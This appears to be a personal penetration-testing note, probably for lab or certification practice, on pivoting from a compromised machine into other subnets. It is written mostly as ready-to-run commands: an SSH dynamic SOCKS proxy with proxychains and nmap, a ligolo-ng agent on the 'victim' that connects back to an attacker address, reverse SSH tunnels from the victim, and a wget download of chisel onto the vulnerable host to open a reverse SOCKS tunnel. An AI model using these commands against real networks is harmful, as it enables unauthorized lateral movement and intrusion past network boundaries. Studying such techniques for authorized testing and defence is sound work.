What to look for on a compromised machine
below you can see that this machine is connected to a different subnet
![[Pasted image 20230310175118.png]]

which means you can connect to this network using the compromised machine

![[Pasted image 20230310175512.png]]
using this command: sudo ssh -N -D 127.0.0.1:9999 sean@10.11.1.251 -fN
you can set a port on your machine to run commands to the compromised machine by directing all traffic to your port by signing into the compromised machine ssh

then you can use proxychains to run commands to the port from the compromised machine thay you have setup, which is 9999.
You can set a port in proxychain conf file that you want to use.
using this command to get to the config: sudo nano /etc/proxychains.conf
![[Pasted image 20230310180032.png]]

use this command to run nmap throuhg proxychains: proxychains nmap --top-ports=20 -sT -Pn 10.1.1.247
you should be able to scan any machine on this network this way


------------------------------------------------------------------------
# Setting up ligolo-ng
```
// Use these 3 commands to setup your ligolo network interface and to run ligolo
# sudo ip tuntap add user cyrano mode tun ligolo
# sudo ip link set ligolo up
# ./proxy -selfcert

// Use this command to add the victim network subnet to your network interface that you are trying to tunnel into.
# sudo ip route add IP/24 dev ligolo

// Use this command to confirm the route was added to your list
# ip route list

// Run agent on victim machine to receive a session on attacker machine
agent.exe -connect 192.168.45.195:11601 -ignore-cert

// Use this command to add a listner
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:80
```


## Tools
[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng "https://github.com/nicocha30/ligolo-ng")
https://www.youtube.com/watch?v=DM1B8S80EvQ

proxychains


-------------------------------------------------------------
## Tunneling with ssh from the victim
ssh port forward from victim machine when ssh is only usable from the inside of victim machine
``` 
attack machine
sudo systemctl ssh
sudo systemctl enable ssh
sudo systemctl start ssh

from victim machine: enter attacker ssh information
ssh attacker@192.168.45.195 -R 8000:localhost:8000

# This option allows you to ssh from victim machine to attack machine, so you can run enumaration scans
ssh -N -R 1080 attacker@IP
```


------------------------------------------------------
## Setting up chisel

```
#attack machine setup, port is the attack machine listening port
./chisel server --port 9000 --socks5 --reverse

#Download chisel on vuln machine and run it
wget http://IP/chisel -o chisel.exe
#This will be the port you are forwarding from vuln machine back to attack machine.
windows machine
.\chisel.exe client IP:PORT R:socks
Linux machine
./chisel client IP:PORT R:socks


#make sure you have /etc/proxychains4.conf setup for w/e socks5 port you plan on using. ie:socks5 127.0.0.1 1080

```